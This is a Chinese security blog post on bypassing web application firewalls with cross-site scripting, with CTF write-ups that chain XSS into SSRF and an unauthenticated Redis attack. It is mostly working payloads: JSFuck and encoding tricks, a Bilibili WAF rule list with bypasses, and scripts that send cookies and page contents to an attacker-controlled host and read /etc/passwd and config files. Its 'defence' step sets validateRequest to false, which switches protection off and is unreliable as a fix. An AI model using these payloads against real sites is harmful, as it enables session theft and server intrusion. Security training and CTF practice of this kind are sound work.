+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>　　这是一个黑客奇葩的想法。</p>
+<p>　　在黑客行为中，你的js代码可能被关键词检测，于是考虑躲避关键词检测的想法，例如 eval等关键词。</p>
+<p>　　1、想了各种方法来规避这个检测。</p>
+<p>　　2、把方法写成通用的程序。</p>
+<p>　　3、把包含的字符做到极致，最后只剩下 ()+[]!  这六个字符。</p>
+<p>这段代码来着于这个网站转码得到：<a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p>
+<p>这里是它的百科，感兴趣可以去了解下：<a href="https://en.wikipedia.org/wiki/JSFuck">https://en.wikipedia.org/wiki/JSFuck</a></p>
+<p>1、脚本注入时防止过滤</p>
+<p>2、一定程度加密关键代码（生成代码很长，不适合加密大量代码。只能一定程度上加密，不能依赖）</p>
+<p>3、装逼用（我最中意的用途）</p>
+<p>结论：转换后本质依然是javascript，通过javascript的一些性质来生成，具体实现可以看这里的代码<a href="https://github.com/aemkei/jsfuck">https://github.com/aemkei/jsfuck</a></p>
+</blockquote>
+<p>5.HTML编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;1&apos; onerror=&apos;aler&amp;#x0074;(1)&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>6.base64编码（仅data支持）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUnE5bjZ6dT48L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br><span class="line">格式：</span><br><span class="line">Data:&lt;mime type&gt;,&lt;encoded data&gt;</span><br><span class="line">Data //协议</span><br><span class="line">&lt;mime type&gt; //数据类型</span><br><span class="line">charset=&lt;charset&gt;  //指定编码</span><br><span class="line">[;base64] //被指定的编码</span><br><span class="line">&lt;encoded data&gt; //定义data协议的编码</span><br><span class="line">特点：不支持IE</span><br></pre></td></tr></table></figure>
+
+<h1 id="非基于Web的XSS注射"><a href="#非基于Web的XSS注射" class="headerlink" title="非基于Web的XSS注射"></a>非基于Web的XSS注射</h1><p><strong>PowerDNS Recursor</strong></p>
+<p>在我们的演讲中，Chris提到他在一个流行的DNS软件中发现了一个不常见的XSS，所以我决定从它开始强调网络并不总是唯一的攻击媒介。</p>
+<p>PowerDNS Recursor是一款高端，高性能的解析名称服务器，可为至少1亿用户的DNS解析提供支持。Recursor是两个名称服务器产品之一，其主要目标是充当解析DNS服务器。</p>
+<p>一个<a href="https://blog.fortinet.com/2017/12/02/powerdns-recursor-html-script-injection-vulnerability-a-walkthrough">详细的演练</a>解释它是如何可能通过使用命令行工具挖一个DNS查询来注入XSS有效载荷：</p>
+<p><img src="https://www.websec.ca/img/three-non-web-based-xss-injections/dig.png" alt="img"></p>
+<p>而这又在Web UI中呈现：</p>
+<p><img src="https://www.websec.ca/img/three-non-web-based-xss-injections/powerdns.png" alt="img"></p>
+<p><strong>Symantec SSL Toolbox</strong>这是我在三年前在Symantec的SSL证书测试程序中找到并报告的已修复漏洞。此<a href="https://cryptoreport.websecurity.symantec.com/checker/">免费在线服务</a>用于从给定URL的x509 SSL证书中提取和显示值，信任其内容，而无需清理字段中的数据。</p>
+<p>因此，我在不同的字段中创建了一个值为“<script> alert（document.cookie）; </script>”的SSL证书，并将其安装在Web服务器的前面：</p>
+<p><img src="https://www.websec.ca/img/three-non-web-based-xss-injections/symantec.png" alt="img"></p>
+<p>分析此类证书的结果是正在执行的JavaScript代码：</p>
+<p><img src="https://www.websec.ca/img/three-non-web-based-xss-injections/symantec-xss.png" alt="ximg"></p>
+<p><strong>RATS（安全性粗略审计工具）</strong>由CERN计算机安全部门开发，<a href="https://security.web.cern.ch/security/recommendations/en/codetools/rats.shtml" target="_blank" rel="noopener">RATS</a>是一个非常好的静态代码分析工具。我喜欢它并且已经使用它多年了。然而，最后一个版本可以追溯到2013年12月，现在可能没有维护，但不确定。</p>
+<p>去年我在火车上很无聊，发现这个无用的XSS。RATS收到一个包含源代码的文件夹，并创建一个包含结果的HTML报告，其中还包括所分析文件的名称，因此攻击向量非常明显。我在其名称中创建了一个包含JavaScript代码的文件：</p>
+<p><img src="https://www.websec.ca/img/three-non-web-based-xss-injections/rats.png" alt="img"></p>
+<p>分析之后，注入的JavaScript将在报告中呈现：</p>
+<p><img src="https://www.websec.ca/img/three-non-web-based-xss-injections/rats-xss.png" alt="img"></p>
+<h1 id="CTF赛题"><a href="#CTF赛题" class="headerlink" title="CTF赛题"></a>CTF赛题</h1><p><a href="https://www.anquanke.com/post/id/156377" target="_blank" rel="noopener">XSS的威力：从XSS到SSRF再到Redis</a></p>
+<h2 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a>xssme</h2><p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://vps_ip:23333&apos;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>vps：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 23333</span><br></pre></td></tr></table></figure>
+
+<p>收获flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://ugelgr.ceye.io/?&apos;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fypr96reo5j20jc07ojst.jpg" alt></p>
+<p>解码后得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=9crkuhdqs9b1jkslebpieprr86; FLAG_XSSME=FLAG&#123;Sometimes, XSS can be critical vulnerability &lt;script&gt;alert</span><br></pre></td></tr></table></figure>
+
+<h2 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a>xssrf leak</h2><p>xss去本地访问，再将页面内容打出来</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"document.location='http://ugelgr.ceye.io/?'+btoa(document.body.innerHTML)"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>编码绕过</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fypreygzbrj20lz0a1dmd.jpg" alt></p>
+<p><strong>解码后保存到本地html里打开</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprfv1be7j20re0lcmyx.jpg" alt></p>
+<p>发现多了一个send request的功能，跟过去看代码发现多了一个send request的功能，跟过去看代码<br><a href="https://p5.ssl.qhimg.com/t016761eb473b221e42.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t016761eb473b221e42.png" alt="img"></a></p>
+<p>没错，是多了一个request.php<br>那么结合题目意思，应该是有ssrf，我想应该就是利用这里的request.php了吧<br>那么继续去读这个页面的html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.onreadystatechange=function()</span></span></span><br><span class="line"><span class="tag"><span class="string">&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.open("</span><span class="attr">GET</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.send</span>();</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>经过编码后发送，得到<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprjod9cbj21e6076n0h.jpg" alt>同样解码后发现代码<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprkntdnjj21900h2jsr.jpg" alt>应该xss的点就是在这里了<br>于是尝试file协议读<code>/etc/passwd</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.onreadystatechange=function()</span></span></span><br><span class="line"><span class="tag"><span class="string">&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.open("</span><span class="attr">POST</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.send</span>("<span class="attr">url</span>=<span class="string">file:///etc/passwd</span>");</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprlccny8j2178182k0b.jpg" alt>发现成功读取了<code>/etc/passwd</code><br>那么我们回想到最初的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /config.php</span><br><span class="line">Disallow: /you/cant/read/config.php/can/you?</span><br><span class="line">Disallow: /backup.zip</span><br></pre></td></tr></table></figure>
+
+<p>于是直接读config.php</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.onreadystatechange=function()</span></span></span><br><span class="line"><span class="tag"><span class="string">&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.open("</span><span class="attr">POST</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.send</span>("<span class="attr">url</span>=<span class="string">file:///var/www/html/config.php</span>");</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprly0fcwj21b012en16.jpg" alt>cool，于是我们拿到了第二个flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a>xssrf redis</h2><p>只剩下最后一步打redis了</p>
+<p>这里很容易就想到了gopher未授权访问打redis<br>上一题提示我们redis再25566端口，于是我们尝试访问一下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.onreadystatechange=function()</span></span></span><br><span class="line"><span class="tag"><span class="string">&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.open("</span><span class="attr">POST</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.send</span>("<span class="attr">url</span>=<span class="string">gopher://127.0.0.1:25566/_info%250a_quit</span>");</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>于是愉快的打出信息，发现果然是未授权访问<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fypro47h7hj20w211o0vi.jpg" alt>那么看看key有哪些</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprovnhvtj20nq0vm75o.jpg" alt>发现了flag<br>然后我们尝试读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_get%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>发现报错<br><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprpnzlqij21020eaab5.jpg" alt>发现类型错误了<br>那我们看看类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_type%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://p3.ssl.qhimg.com/t01c56b570a1f671daa.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01c56b570a1f671daa.png" alt="img"></a></p>
+<p>发现是个list<br>那我们看看长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_llen%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyprrfqsanj20qg0kut9v.jpg" alt>发现是53<br>那我们可以愉快的读取list了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://p0.ssl.qhimg.com/t016b256ff57a040832.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t016b256ff57a040832.png" alt="img"></a></p>
+<p>我们把它拼接起来</p>
+<p><a href="https://p2.ssl.qhimg.com/t01584c35dc674b052a.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01584c35dc674b052a.png" alt="img"></a>so cool<br>得到最后的flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Rediswithout authentication is easy to exploit&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="B站waf"><a href="#B站waf" class="headerlink" title="B站waf"></a>B站waf</h1><p>xss探针</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';`"&gt;&lt;aaa bbb=ccc&gt;ddd&lt;aaa/&gt;</span></span><br><span class="line"><span class="string">aaa&lt;/script&gt;bbb&lt;script&gt;ccc</span></span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;script&gt;</span><br><span class="line">top[<span class="string">'alert'</span>](<span class="number">1</span>)</span><br><span class="line">top[<span class="string">'al'</span>+<span class="string">'ert'</span>](<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>至今已发现的b站waf规则总结：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">on\w+=(?:prompt|alert|confirm)&#123;<span class="number">1</span>&#125;\(\w+\)</span><br><span class="line"></span><br><span class="line">&lt;[^&gt;]*\s+on\w+=(?:prompt|alert|confirm)&#123;<span class="number">1</span>&#125;\(\w+</span><br><span class="line"></span><br><span class="line">&lt;script&gt;[^<span class="string">`]*document\[\w+\]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script&gt;[^`</span>]*<span class="built_in">document</span>\.\w+</span><br><span class="line"></span><br><span class="line">&lt;script&gt;\w+\.cookie</span><br><span class="line"></span><br><span class="line">&lt;script\s(.*\s)?src(=\w+)?&gt;</span><br><span class="line"></span><br><span class="line">&lt;a\s(.*\s)?href=javascript:.*&gt;</span><br><span class="line"></span><br><span class="line">&lt;img\s[^&gt;]*on\w+=\w+\[\w*\]\(\w*\)</span><br><span class="line"></span><br><span class="line">&lt;img\s[^&gt;]*on\w+=<span class="string">`\w*`</span>.*</span><br></pre></td></tr></table></figure>
+
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="pdf-xss"><a href="#pdf-xss" class="headerlink" title="pdf xss"></a>pdf xss</h2><p>在新建文档中添加页面属性</p>
+<p>在动作标签运行JavaScript命令<code>app.alert(‘XSS’);</code></p>
+<p>然后保存为PDF文件</p>
+<p>打开pdf文件，JavaScript代码执行</p>
+<p>尝试把 PDF 文件嵌入到网页中并试运行。创建一个 HTML 文档，代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span></span></span><br><span class="line"><span class="tag"><span class="attr">data</span>=<span class="string">"test.pdf"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">heigh</span>=<span class="string">"100%"</span></span></span><br><span class="line"><span class="tag"><span class="attr">type</span>=<span class="string">"application/pdf"</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>除了把 JavaScript 嵌入 PDF 文件中执行，还可以利用基于 DOM 的方法执行 PDF XSS。</p>
+<p><strong>修复方法</strong></p>
+<p>　　而作为网站管理员或开发者，可以选择强迫浏览器下载 PDF 文件，而不是提供在线浏览等，或修改 Web 服务器配置的 header 和相关属性。</p>
+<p>　　可以使用第三方插件解析pdf，不用chrome自带的pdf解析就行，<a href="https://github.com/adobe-type-tools/cmap-resources" target="_blank" rel="noopener">https://github.com/adobe-type-tools/cmap-resources</a></p>
+<p>参考链接：</p>
+<p><a href="https://www.t00ls.net/thread-48480-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-48480-1-1.html</a></p>
+<p><a href="https://blog.xss.lc/experience-sharing/71.html" target="_blank" rel="noopener">https://blog.xss.lc/experience-sharing/71.html</a></p>
+<h2 id="上传文件处XSS"><a href="#上传文件处XSS" class="headerlink" title="上传文件处XSS"></a>上传文件处XSS</h2><p>在上传的图片内容中插入xss攻击的payload，之后访问返回的name文件，可触发xss代码。</p>
+<p>修改页面内容为payload</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2f87r87wj20l607o0vf.jpg" alt></p>
+<p>访问图片url触发xss</p>
+<p><strong>安全建议</strong>：</p>
+<p>(1) 判断参数的合法性，不合法不返回任何内容。</p>
+<p>(2) 对用户输入进行html实体编码，并过滤常见html标签及javascript脚本。</p>
+<p><strong>文件上传处文件名XSS</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2fcazc3bj20qy0ezwiv.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2fe0qt0gj20r00d6djd.jpg" alt></p>
+<p><strong>安全建议：</strong></p>
+<p>(1) 判断参数的合法性，不合法不返回任何内容。</p>
+<p>(2) 严格限制URL参数输入值的格式，不能包含不必要的特殊字符（%0d、%0a、%0D、%0A等）。</p>
+<p>(3) 针对Cookie设置HttpOnly策略。</p>
+<p>(4) 针对ASP.NET的防XSS库，Microsoft有提供统一的库，具体可以参见如下链接微软官网：</p>
+<p>修改web.config文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line"></span><br><span class="line">    &lt;system.web&gt;</span><br><span class="line"></span><br><span class="line">        &lt;pages validateRequest=&quot;false&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/system.web&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://msdn.microsoft.com/en-us/library/aa973813.aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/aa973813.aspx</a></p>
+<h2 id="excel模版xss"><a href="#excel模版xss" class="headerlink" title="excel模版xss"></a>excel模版xss</h2><p>从本地导入excel表格，表格内数据含xss payload 即可触发XSS漏洞</p>
+<p>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;img/src=<span class="string">""</span>onerror=alert(<span class="number">2</span>)&gt;</span><br><span class="line">&lt;src=x onerror=alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2flkrd5pj20hm0b9ace.jpg" alt></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>1、HTML实体化编码，预防xss漏洞。</p>
+<p>2、对特殊字符，例如’ “ >< % 等进行过滤。</p>
+<p>3、传递参数时对cookies进行校验，防止越权漏洞。</p>
+<p>4、开启CSP或HTTPONLY，防止用户凭证泄露。</p>
+<h1 id="补充CSP"><a href="#补充CSP" class="headerlink" title="补充CSP"></a>补充CSP</h1><p><a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a></p>
+<p><a href="https://xz.aliyun.com/t/4074#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/4074#toc-8</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2018/12/30/2018-12-30-BypassWaf_xss/" title="BypassWaf_xss">https://wh0ale.github.io/2018/12/30/2018-12-30-BypassWaf_xss/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i># xss</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2018/12/28/2018-12-28-JSONP漏洞/" rel="next" title="jsonp漏洞">
+                <i class="fa fa-chevron-left"></i> jsonp漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/03/2019-1-3-BypassWaf_webshell/" rel="prev" title="BypassWaf_webshell">
+                BypassWaf_webshell <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
